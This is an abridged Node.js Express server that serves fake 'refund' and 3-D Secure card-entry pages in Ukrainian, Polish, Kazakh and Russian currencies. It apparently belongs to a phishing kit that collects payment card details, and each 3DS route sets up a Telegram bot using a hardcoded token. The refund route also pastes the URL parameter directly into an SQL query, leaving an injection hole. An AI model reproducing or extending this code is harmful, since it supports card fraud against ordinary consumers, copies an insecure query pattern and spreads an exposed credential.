...
try {
    ...
    app.get('/refund/:userlink', (req, res) => {
        client.query(`SELECT amount, currency FROM userssrefund WHERE link = '${req.params.userlink}'`, (err, ress)=>{
            ...
            if (req.params.userlink.search('ua') !=  -1){
                ...
                var amount = `Сума до оплати ${ress.rows[0].amount} грн`;
            } else if (req.params.userlink.search('pln') !=  -1) {
                console.log(2);
                var index = 'index_card_pln';
                var amount = `kwota do zapłaty ${ress.rows[0].amount} zł`;
            } else if (req.params.userlink.search('kz') !=  -1) {
                console.log(2);
                var index = 'index_card_kz';
                var amount = `Cумма к оплате ${ress.rows[0].amount} ₸`;
            } else {
                console.log(3);
                var index = 'index_card';
                var amount = `Cумма к оплате ${ress.rows[0].amount} руб`;
            }
            if (ress) {
                const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
                res.render(index, {amount: amount, user_link: req.params.userlink});
    ...
    app.post('/3ds', (req, res) => {
        var amount = `Cумма к оплате ${req.body.amount} руб`;
        res.render('index_card', {amount: amount, user_link: req.body.user_link});
        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
    ...
    app.post('/3dsua', (req, res) => {
        var amount = `Сума до оплати ${req.body.amount} грн`;
        res.render('index_card_ua', {amount: amount, user_link: req.body.user_link});
        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
    ...
    app.post('/3dspln', (req, res) => {
        var amount = `kwota do zapłaty ${req.body.amount} zł`;
        res.render('index_card_pln', {amount: amount, user_link: req.body.user_link});
        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
    ...
    app.post('/3dskz', (req, res) => {
        var amount = `Cумма к оплате ${req.body.amount} ₸`;
        res.render('index_card_kz', {amount: amount, user_link: req.body.user_link});
        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
